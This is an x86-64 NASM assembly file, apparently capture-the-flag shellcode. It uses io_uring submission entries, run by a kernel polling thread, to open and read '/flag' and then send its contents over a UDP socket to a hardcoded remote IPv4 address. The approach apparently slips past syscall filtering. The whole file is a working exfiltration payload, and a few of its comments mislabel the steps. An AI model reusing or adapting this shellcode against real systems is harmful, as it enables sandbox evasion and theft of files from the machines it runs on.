[BITS 64]

struc io_uring_params
    sq_entries resd 1
    cq_entries resd 1
    io_uring_params_flags  resd 1
    sq_thread_cpu resd 1
    sq_thread_idle resd 1
    features resd 1
    wq_fd resd 1
    io_uring_params_resv resd 3
    ; struct io_sqring_offsets
    sqoff_head resd 1
    sqoff_tail resd 1
    sqoff_ring_mask resd 1
    sqoff_ring_entries resd 1
    sqoff_flags resd 1
    sqoff_dropped resd 1
    sqoff_array resd 1
    sqoff_resv1 resd 1
    sqoff_user_addr resq 1
    ; struct io_cqring_offsets
    cqoff_head resd 1
    cqoff_tail resd 1
    cqoff_ring_mask resd 1
    cqoff_ring_entries resd 1
    cqoff_flags resd 1
    cqoff_dropped resd 1
    cqoff_array resd 1
    cqoff_resv1 resd 1
    cqoff_user_addr resq 1
endstruc

struc io_uring_sqe
        sqe_opcode resb 1;		
        sqe_flags resb 1;		
	sqe_ioprio resw 1;		
	sqe_fd resd 1;  		
        sqe_off resq 1;
        sqe_addr resq 1;
	sqe_len resd 1;		
        sqe_axu_flags resd 1;
        sqe_user_data resq 1;
        sqe_buf_index resw 1;
        sqe_personality resw 1;
        sqe_file_index resd 1;
        sqe_pad2 resq 2;
endstruc

%define __x64_sys_io_uring_setup       0x1a9
%macro io_uring_setup 2 ; (u32, entries, struct io_uring_params __user *, params)
        push __x64_sys_io_uring_setup
        pop rax
        push %1
        pop rdi
        push %2
        pop rsi
        syscall
%endmacro

%define DEPTH                   (0x10)
%define IORING_SETUP_NO_MMAP	(1 << 14)
%define IORING_SETUP_SQPOLL	(1 << 1)	
%define IORING_OP_OPENAT        (18)
%define IORING_OP_READ          (22)
%define IORING_OP_SOCKET        (45)
%define IORING_OP_CONNECT       (16)
%define IORING_OP_WRITE         (23)



          global    _start
          section   .text

%define base rbp
_start: 
        ; Setup base for locatation
        mov base, rbx;
        lea rsi, [base + uring_params]
        ; Setup sq_ring and sqe_ring
        mov dword [rsi + sqoff_user_addr], 0xc0d3000 + 0x1000 ; rings
        mov dword [rsi + cqoff_user_addr], 0xc0d3000 + 0x2000 ; sq_sqes
        mov dword [rsi + sq_thread_idle],  2000000         ; sq_thread_idle
        mov dword [rsi + io_uring_params_flags],  IORING_SETUP_NO_MMAP | IORING_SETUP_SQPOLL ; flags

        ; Save sq_ring
        mov dword [base + sq_ring], 0xc0d3000 + 0x2000;
        ; Save sqe_ring
        mov dword [base + sqe_ring], 0xc0d3000 + 0x1000;

        ; Setup sq_array
        mov rax, [base + sq_ring]
        mov rbx, 0x40 + DEPTH * 2 * 0x10
        add rax, rbx
        mov rcx, 0
        loop_set:
                mov [rax], rcx
                add rcx, 0x1
                add rax, 0x4
                cmp rcx, DEPTH
                jb loop_set

        ; SQE 1: open("/flag")
        mov rax, [base + sqe_ring]
        ; add rax, 0x40
        mov rbx, (-100 << 32) | (0x0000 << 16) | (0x04 << 8) | IORING_OP_OPENAT;
        mov qword [rax], rbx;
        lea rbx, [base + flag_name];
        ; sqe_addr: file to open / sqe_len: open_mode / sqe_axu_flags: open_flags
        mov qword [rax + sqe_addr], rbx;

        ; SQE 2: read(4, flag_data, 0x100)
        add rax, 0x40
        mov rbx, (4 << 32) | (0x0000 << 16) | (0x04 << 8) | IORING_OP_READ;
        mov qword [rax], rbx;
        lea rbx, [base + flag_data];
        ; sqe_addr:
        mov qword [rax + sqe_addr], rbx;
        mov qword [rax + sqe_len], 0x100;

        ; SQE 4 : socket(AF_INET, SOCK_DGRAM, 0)
        add rax, 0x40
        mov rbx, (2 << 32) | (0x0000 << 16) | (0x04 << 8) | IORING_OP_SOCKET;
        mov qword [rax], rbx;
        ; type
        mov qword [rax + sqe_off], 1;

        ; SQE 4 : connect(AF_INET, addr, sizeof(addr))
        add rax, 0x40
        mov rbx, (5 << 32) | (0x0000 << 16) | (0x04 << 8) | IORING_OP_CONNECT;
        mov qword [rax], rbx;
        ; addrlen
        mov qword [rax + sqe_off], 0x10;
        ; addr
        lea rbx, [base + socket_addr];
        mov qword [rax + sqe_addr], rbx;

        ; SQE 5 : write(1, flag_data, 0x100)         fd | prio | flags | opcode
        add rax, 0x40
        mov rbx, (5 << 32) | (0x0000 << 16) | (0x00 << 8) | IORING_OP_WRITE;
        mov qword [rax], rbx;
        lea rbx, [base + flag_data];
        ; sqe_addr:
        mov qword [rax + sqe_addr], rbx;
        mov qword [rax + sqe_len], 0x100;

        ; update sq_ring -> tail
        mov rax, [base + sq_ring];
        ; mov rbx, [base + uring_params + sqoff_tail];
        mov rbx, 4;
        add rax, rbx;
        mov dword [rax], 5;

        ; Save io_uring fd
        io_uring_setup DEPTH, rsi
        mov [base + ring_fd], rax;

        jmp $
        
flag_name db "/flag", 0
ring_fd    dd 0
sq_ring     dq 0
sqe_ring    dq 0 
socket_addr     dq 0xdd00de1eb8220002
                dq 0
uring_params:
istruc io_uring_params
        iend
flag_data:
